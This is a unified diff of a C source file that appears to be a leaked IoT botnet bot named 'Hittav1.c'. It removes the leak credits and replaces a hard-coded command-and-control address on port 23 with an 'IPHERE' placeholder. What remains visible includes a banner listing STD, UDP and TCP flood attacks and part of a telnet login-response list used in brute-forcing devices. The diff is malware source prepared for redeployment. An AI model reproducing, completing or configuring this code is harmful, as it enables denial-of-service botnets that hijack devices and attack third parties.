@@ -1,16 +1,7 @@
 
 
-/* This is for the hackers */
-// This is a private file. //
-/* Please don't leak this. */
-
 /*
-
-This build was done by: Ozzy Aragon
-Leaked by DevilsExploits & Fameless
-
 ===============================================
-- Build #1 (Hittav1.c)                        -
 -                                             -
 - Contents:                                   -
 -                                             - 
@@ -24,10 +15,7 @@ Leaked by DevilsExploits & Fameless
 -  [+] Modified STD Flood                     -
 -  [+] Normal UDP Flood                       -
 -  [+] Normal TCP Flood                       -
------------------------------------------------             
-|There will be more builds to come!           |
-|_____________________________________________|
-|_____________________________________________|                                 
+===============================================                              
 */
 
 
@@ -88,7 +76,7 @@ char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "
 
 unsigned char *commServer[] =
 {
-        34.83.168.60:23"
+        "IPHERE:23"
 };
 
 //    ___                 _
